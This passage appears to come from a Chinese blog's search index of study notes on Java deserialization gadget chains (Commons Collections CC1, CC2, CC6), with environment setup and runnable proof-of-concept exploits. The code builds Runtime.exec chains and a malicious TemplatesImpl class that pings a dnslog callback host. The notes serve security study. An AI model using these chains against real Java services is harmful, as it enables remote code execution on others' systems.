hashCode() 这里了，这一条 hashCode() 的链子该如何构造呢？ 我们去找谁调用了 hashCode() 方法，这里我就直接把答案贴出来吧，因为在 Java 反序列化当中，找到 hashCode() 之后的链子用的基本都是这一条。 xxx.readObject() HashMap.put() --自动调用--\u003e HashMap.hash() 后续利用链.hashCode() 更巧的是，这里的 HashMap 类本身就是一个非常完美的入口类。 如果要写一段从 HashMap.put 开始，到 InvokerTransformer 结尾的弹计算器的 EXP，应当是这样的。 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e hashMap = new HashMap\u003c\u003e(); Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); // TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"keykey\"); // tiedMapEntry.getKey(); //HashMap\u003cObject, Object\u003e expMap = new HashMap\u003c\u003e() 这里打断点，会发现直接 24 行就弹计算器了，不要着急，这里是一个 IDEA 的小坑，后续会讲。 HashMap\u003cObject, Object\u003e expMap = new HashMap\u003c\u003e(); expMap.put(tiedMapEntry,\"valval\"); 初步的exp： package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; public class CC62 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundExce","date":"2023-11-26","objectID":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:2:2","tags":["cc链","java安全","反序列化"],"title":"CommonsCollections6利用链学习","uri":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"总结 大部分情况CC6就完全够用了 cc1和cc1的LazyMap链(巧妙)有版本限制 cc3是新思路 cc2和4是Commons-Collections4才有的 cc5基本一样 cc7和cc6很像 ","date":"2023-11-26","objectID":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:3:0","tags":["cc链","java安全","反序列化"],"title":"CommonsCollections6利用链学习","uri":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"环境配置 CC版本设置为4 javasist用来动态修改java字节码的助手 在cc4.0中，cc1链也可以用 环境： JDK8u65 openJDK 8u65 Maven 3.6.3(其余版本可以先试试，不行再降版本) Commons-Collections 4.0 Maven 下载 Commons-Collections4 依赖： \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections4\u003c/artifactId\u003e \u003cversion\u003e4.0\u003c/version\u003e \u003c/dependency\u003e ","date":"2023-11-24","objectID":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:1:0","tags":["cc链2","反序列化","Java安全"],"title":"CommonsCollections2利用链学习","uri":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"最简demo 漏洞利用的原型（还不是反序列化）： static Object cc2(String command) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), //Runtime.class的类型是class new InvokerTransformer(\"getMethod\" , new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\" , new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\" , new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator transforming_Comparator = new TransformingComparator(transformerChain); transforming_Comparator.compare(1, 2); return \"1\"; } ","date":"2023-11-24","objectID":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:2:0","tags":["cc链2","反序列化","Java安全"],"title":"CommonsCollections2利用链学习","uri":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"理解demo 主要逻辑和CC1是类似的，唯一改变的，就是在流程里面增加了一个TransformingComparator对象，然后当调用该对象的compare方法时，就会触发rce。并且从compare方法中我们可以看到，其实就是调用了transformer的transform方法，这就与cc1中gadget的结尾完全一样了（transformer的transform之后的部分）。 ","date":"2023-11-24","objectID":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:2:1","tags":["cc链2","反序列化","Java安全"],"title":"CommonsCollections2利用链学习","uri":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"继续构造gadget 从上面逻辑知道，如果能够触发TransformingComparator对象的compare方法，就能构造出一个rce链。 并且，我们在自己的demo中，通过执行 transforming_Comparator.compare(1, 2); 但是，现实场景中，没人帮我们执行这个函数。所以，我们现在要开始寻找，有没有哪个类，在它的readObject逻辑中会触发这个动作（给Map新增元素）。 这个类就是PriorityQueue，这也是java的一个原生类，在java.util.PriorityQueue中 我们看PriorityQueue的代码： 首先是反序列化的时候会触发readObject方法 一直跟着走 ","date":"2023-11-24","objectID":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:3:0","tags":["cc链2","反序列化","Java安全"],"title":"CommonsCollections2利用链学习","uri":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"第一个poc demo import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC2 { public static void main(String[] args) throws Exception { byte[] evilData = serialize(cc2(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\")); unserialize(evilData); } static Object cc2(String command) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), //Runtime.class的类型是class new InvokerTransformer(\"getMethod\" , new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\" , new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\" , new Class[]{String.class}, new Object[]{command}) }; Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator transforming_Comparator = new TransformingComparator(transformerChain); //这之前都是一样的 PriorityQueue priorityQueue = new PriorityQueue(2); priorityQueue.add(1); priorityQueue.add(2); //给优先队列中添加两个元素 //利用反射来设置PriorityQueue对象的comparator属性 Field field = priorityQueue.getClass().getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(priorityQueue, transforming_Comparator); return priorityQueue; } public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(bout); objOut.writeObject(obj); return bout.toByteArray(); } public static Object unserialize(final byte[] seria) throws Exception{ ByteArrayInputStream btin = new ByteArrayInputStream(seria); ObjectInputStream ois = new ObjectInputStream(btin); return ois.readObject(); } } 这个demo完全可用，可以rce，但是不是网上公开的cc2，我们再来看看网上的cc2里面怎么做的。这样可以学习一些新东西 ","date":"2023-11-24","objectID":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:3:1","tags":["cc链2","反序列化","Java安全"],"title":"CommonsCollections2利用链学习","uri":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"第二个poc demo 自己创建一个恶意类： import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class EvilTemplatesImpl extends AbstractTranslet { //必须实现AbstractTranslet //当一个类被实例化的时候会执行其构造方法，所以把恶意代码写在了构造方法里面 public EvilTemplatesImpl() throws Exception{ super(); Runtime.getRuntime().exec(\"ping xpsssss.glultz.dnslog.cn -c 1\"); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } poc： import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC2 { public static void main(String[] args) throws Exception { byte[] evilData = serialize(cc2()); unserialize(evilData); } static Object cc2() throws Exception{ //构造恶意类EvilTemplatesImpl并转换(使用javassist)为字节码 ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.getCtClass(\"EvilTemplatesImpl\"); //这里恶意类放在同目录下所以没有写包名 byte[] bytes = ctClass.toBytecode(); System.out.println(bytes); TemplatesImpl TemplatesImpl_instance = new TemplatesImpl(); //将恶意类的字节码设置给_bytecodes属性 Class\u003c?\u003e aClass = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); Field bytecodes = aClass.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(TemplatesImpl_instance, new byte[][]{bytes}); //设置属性_name为恶意类 Field name = aClass.getDeclaredField(\"_name\"); name.setAccessible(true); System.out.println(name.get(TemplatesImpl_instance)); name.set(TemplatesImpl_instance, \"xpssss\"); //构造利用链 InvokerTransformer transformer = new InvokerTransformer(\"newTransformer\", null, null); TransformingComparator transforming_Comparator = new TransformingComparator(transformer); //触发漏洞 PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(2); //设置的comparator属性 Field field = queue.getClass().getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue, transforming_Comparator); //设置queue属性 field = queue.getClass().getDeclaredField(\"queue\"); field.setAccessible(true); //队列至少需要2个元素 Object[] objects = new Object[]{TemplatesImpl_instance, TemplatesImpl_instance}; field.set(queue, objects); return queue; } public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(bout); objOut.writeObject(obj); return bout.toByteArray(); } public static Object unserialize(final byte[] seria) throws Exception{ ByteArrayInputStream btin = new ByteArrayInputStream(seria); ObjectInputStream ois = new ObjectInputStream(btin); return ois.readObject(); } } 回顾一下，当执行compare的时候，执行的是： public int compare(final I obj1, final I obj2) { final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); } 也就是去执行transformer的transform方法。此时我们将transformer设置成了InvokerTransformer,以此来调用任意类的指定方法。 在cc2的链子中，有个新的原生类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl。 通过调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类，我们获得更大的权利，我们甚至可以写一个自己的java代码然后调用它","date":"2023-11-24","objectID":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:3:2","tags":["cc链2","反序列化","Java安全"],"title":"CommonsCollections2利用链学习","uri":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"第三个poc demo 所以，我们还需要构造，来触发TemplatesImpl_instance的newTransformer方法，这个就是用到了第一个poc里面的InvokerTransformer了。 poc: import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC2 { public static void main(String[] args) throws Exception { byte[] evilData = serialize(cc2()); unserialize(evilData); } static Object cc2() throws Exception{ //构造恶意类EvilTemplatesImpl并转换(使用javassist)为字节码 ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.getCtClass(\"EvilTemplatesImpl\"); //这里恶意类放在同目录下所以没有写包名 byte[] bytes = ctClass.toBytecode(); System.out.println(bytes); TemplatesImpl TemplatesImpl_instance = new TemplatesImpl(); //修改恶意类的字节码设置给_bytecodes属性 Class\u003c?\u003e aClass = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); Field bytecodes = aClass.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(TemplatesImpl_instance, new byte[][]{bytes}); //设置属性_name不为空 Field name = aClass.getDeclaredField(\"_name\"); name.setAccessible(true); System.out.println(name.get(TemplatesImpl_instance)); name.set(TemplatesImpl_instance, \"xpssss\"); //构造利用链 InvokerTransformer transformer = new InvokerTransformer(\"newTransformer\", null, null); TransformingComparator transforming_Comparator = new TransformingComparator(transformer); //触发漏洞 PriorityQueue queue = new PriorityQueue(2, transforming_Comparator); queue.add(TemplatesImpl_instance); queue.add(TemplatesImpl_instance); //这里会调用transformer.transform() return queue; } public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(bout); objOut.writeObject(obj); return bout.toByteArray(); } public static Object unserialize(final byte[] seria) throws Exception{ ByteArrayInputStream btin = new ByteArrayInputStream(seria); ObjectInputStream ois = new ObjectInputStream(btin); return ois.readObject(); } } 但是如果实际去用，发现根本用不起来。 因为当我们给优先队列新增元素的时候，势必会触发默认的比较，这样的话，我们构造的时候，就已经会触发我们后面的利用链。但是我们的利用链，又是会抛出异常的（因为newTransformer后面有很多处理流程，我们的恶意类并没有去适配） 所以，我们必须确保，在add的时候，不会触发比较流程，或者触发了，但是不会影响我们。 ","date":"2023-11-24","objectID":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:3:3","tags":["cc链2","反序列化","Java安全"],"title":"CommonsCollections2利用链学习","uri":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"第四个 poc demo import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC2 { public static void main(String[] args) throws Exception { byte[] evilData = serialize(cc2()); unserialize(evilData); } static Object cc2() throws Exception{ //构造恶意类EvilTemplatesImpl并转换(使用javassist)为字节码 ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.getCtClass(\"EvilTemplatesImpl\"); //这里恶意类放在同目录下所以没有写包名 byte[] bytes = ctClass.toBytecode(); System.out.println(bytes); TemplatesImpl TemplatesImpl_instance = new TemplatesImpl(); //修改恶意类的字节码设置给_bytecodes属性 Class\u003c?\u003e aClass = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); Field bytecodes = aClass.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(TemplatesImpl_instance, new byte[][]{bytes}); //设置属性_name不为空 Field name = aClass.getDeclaredField(\"_name\"); name.setAccessible(true); System.out.println(name.get(TemplatesImpl_instance)); name.set(TemplatesImpl_instance, \"xpssss\"); //构造利用链 InvokerTransformer transformer = new InvokerTransformer(\"newTransformer\", null, null); TransformingComparator transforming_Comparator = new TransformingComparator(transformer); //触发漏洞 PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); //通过反射设置比较器 Field field = queue.getClass().getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue, transforming_Comparator); //通过反射强行修改队列，将TemplatesImpl_instance加入到队列中 Field field2 = queue.getClass().getDeclaredField(\"queue\"); field2.setAccessible(true); Object[] objects = new Object[]{TemplatesImpl_instance, null}; field2.set(queue, objects); return queue; } public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(bout); objOut.writeObject(obj); return bout.toByteArray(); } public static Object unserialize(final byte[] seria) throws Exception{ ByteArrayInputStream btin = new ByteArrayInputStream(seria); ObjectInputStream ois = new ObjectInputStream(btin); return ois.readObject(); } } CC2 链区别与其他链子一点的区别在于没有用 Transformer 数组。不用数组是因为比如 shiro 当中的漏洞，它会重写很多动态加载数组的方法，这就可能会导致我们的 EXP 无法通过数组实现。 ","date":"2023-11-24","objectID":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:3:4","tags":["cc链2","反序列化","Java安全"],"title":"CommonsCollections2利用链学习","uri":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"总结 ","date":"2023-11-24","objectID":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:4:0","tags":["cc链2","反序列化","Java安全"],"title":"CommonsCollections2利用链学习","uri":"/commonscollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":" Apache Commons是对JDK的拓展，包含了很多开源的工具，用于解决平时编程可能遇到的问题。其中有个组件叫Apache Commons Collections，封装了Java的Collection相关类对象 CC链的利用就是以Apache Commons Collections作为链条的核心，来构造一个最终能够进行rce的gadget ","date":"2023-11-24","objectID":"/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:0:0","tags":["CC链","反序列化","Java安全"],"title":"CommonsCollections1利用链学习","uri":"/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"环境搭建 先创建一个新的maven项目，然后准备好Commons Collections的依赖 \u003c!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e 1.jdk 版本这里，要求的是 jdk8u65 的，如果我们用 jdk8u71 这种，CC 链的漏洞就被修掉了，用不了 jdk不要大于8u65(下载链接https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html) 或者使用zulu的 2.创建完成之后，选中 Project Structure，修改 Modules，SDKs 3.再添加 Maven 中，对 CC1 链的依赖包。 cc依赖也不要高于3.2.1 \u003c!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e 4.修改 sun 包: 因为我们打开源码，很多地方的文件是 .class 文件，是已经编译完了的文件，都是反编译代码，我们很难读懂，所以需要把它转换为 .java 文件。 去这里(https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4)左侧的zip下载源码，解压src.zip，里面的share/sun包源码拷贝到本机jdk的src目录下 5.然后再IDEA的Project Structure中的下面的SDKs加上上面jdk的目录 就可以正常调试了 maven的源码，在右上角download source ","date":"2023-11-24","objectID":"/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:0:1","tags":["CC链","反序列化","Java安全"],"title":"CommonsCollections1利用链学习","uri":"/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"核心demo package org.example2; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CCC1 { public static void main(String[] args) { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[] {\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"xxxx\"); } } TransformedMap TransformedMap用于对java标准数据结构Map做一个修饰，被修饰过的Map在添加新的元素时候，执行一个“回调”。我们通过下面代码对innerMap进行修饰，传出的outerMap就是修饰后的Map： Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer); 对于进入map的新元素(key,value)，会利用keyTransformer对key进行处理，并且利用valueTransformer对value进行处理，当keyTransformer或者valueTransformer被设置为null时，代表不进行处理 这里所谓的“处理”，就是调用Transformer对象里面的相应方法(transform方法)来进行解析 Transformer Transformer本身是一个接口，它只有一个待实现的方法。 TransformedMap在转换Map的新元素的时候，就会调用Transformer对象的transform方法，这个过程就类似在调用一个“回调函数”。 那么，既然Transformer只是一个借口，必然要有实现该接口的类，这些类就很多了，包括下面用到的三个ConstantTransformer，InvokeTransformer，ChainedTransformer。 ConstantTransformer ConstantTransformer是实现了Transformer接口的一个类。代码如下： package org.apache.commons.collections.functors; import java.io.Serializable; import org.apache.commons.collections.Transformer; public class ConstantTransformer implements Transformer, Serializable { private static final long serialVersionUID = 6374440726369055124L; public static final Transformer NULL_INSTANCE = new ConstantTransformer(null); private final Object iConstant; public static Transformer getInstance(Object constantToReturn) { if (constantToReturn == null) { return NULL_INSTANCE; } return new ConstantTransformer(constantToReturn); } public ConstantTransformer(Object constantToReturn) { super(); iConstant = constantToReturn; } public Object transform(Object input) { return iConstant; } public Object getConstant() { return iConstant; } } 它的过程就是在构造函数的时候传入一个对象，并在transform将这个对象再返回（传进去的啥，原封不动将这个对象再返回） InvokeTransformer 也是ConstantTransformer是实现了Transformer接口的一个类 //...省略前面 private InvokerTransformer(String methodName) { super(); iMethodName = methodName; iParamTypes = null; iArgs = null; } public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } catch (NoSuchMethodException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); } } 这个类可以用来执行任意方法，这也是反序列化能指定任意代码的关键。 在实例化这个InvokerTransformer时候，需要传入三个参数，第一个参数是待执行的方法，第二个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表。 重点理解这个类的transform方法： Class cls = input.getClass(); //通过反射获取类所属的对象 Method method = cls.getMethod(iMethodName, iParamTypes); //通过反射获取该类的指定方法 return method.invoke(input, iArgs); //通过反射执行对象的指定方法，并支持提供参数 所以，这个过程中，其实就是可以执行任意类的任意方法了(—\u003e任意代码执行) 那么前面demo中的也就可以理解了： new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[] {\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), ChainedTr","date":"2023-11-24","objectID":"/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:0:2","tags":["CC链","反序列化","Java安全"],"title":"CommonsCollections1利用链学习","uri":"/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"继续构造gadget 注意jdk版本，据说这个最高打到8u71。 我们前面已经知道Common Collections这个包中有几个类可以用来构造rce，并且在自己的代码中通过执行outerMap.put(\"test\", \"xxxx\");实现了rce利用。 但是，在真实场景中，并没有人帮我们执行这个函数。所以我们现在要开始寻找，有没有哪个类，在它的readObject逻辑中会触发这个动作（给Map新增元素）。 这个类就是sun.reflect.annotation.AnnotationInvocationHandler，这是一个java的原生类 不建议直接看反编译的.class代码，可以github打开jdk代码**，然后在gihub后面添加1s打开vscode提供的在线编辑器** Github1s.com https://github.com/openjdk/jdk https://github1s.com/openjdk/jdk/tree/jdk8-b40 可以简单看一下readObject，看构造方法，看属性： private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map\u003cString, Class\u003c?\u003e\u003e memberTypes = annotationType.memberTypes(); for (Map.Entry\u003cString, Object\u003e memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class\u003c?\u003e memberType = memberTypes.get(name); if (memberType != null) { Object value = memberValue.getValue(); if (!(memberType.isInstance(value) ||value instanceof ExceptionProxy)) { memberValue.setValue( // memberValue.put() new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); } } } } 将memberValue转换为一个set，然后再迭代一下就又取出了一个Map叫做memberValue。我们只要将这个memberValue设置为我们的一个TransformedMap对象，然后当它在后面执行memberValue.setValue时，就会触发我们注册的Transformer，进而执行我们为其精心准备的代码。 内部类的调用 想调用AnnotationInvocationHandler的时候无法直接new调用，因为这个一个内部类，导致我们无法直接访问，所以使用反射。 Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object obj = declaredConstructor.newInstance(Retention.class, outerMap); //transformerMap 第一个poc demo package org.example2; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.util.HashMap; import java.util.Map; public class CCC1 { public static void main(String[] args) throws Exception { byte[] evilData = serialize(cc1(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\")); unserialize(evilData); } static Object cc1(String args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[] {args}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object obj = declaredConstructor.newInstance(Target.class, outerMap); //transformerMap return obj; } public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(bout); objOut.writeObject(obj); return bout.toByteArray(); } public static Object unserialize(final byte[] seria) throws Exception{ ByteArrayInputStream btin = new ByteArrayInputStream(seria); ObjectInputStream ois = new ObjectInputStream(btin); return ois.readObject(); } } 还没到反序列化，直接在序列化这一步就直接报错了：因为java.lang.Runtime无法序列化 我们继续优化… 第二个poc demo 因为java.lang.Runtime无法序列化 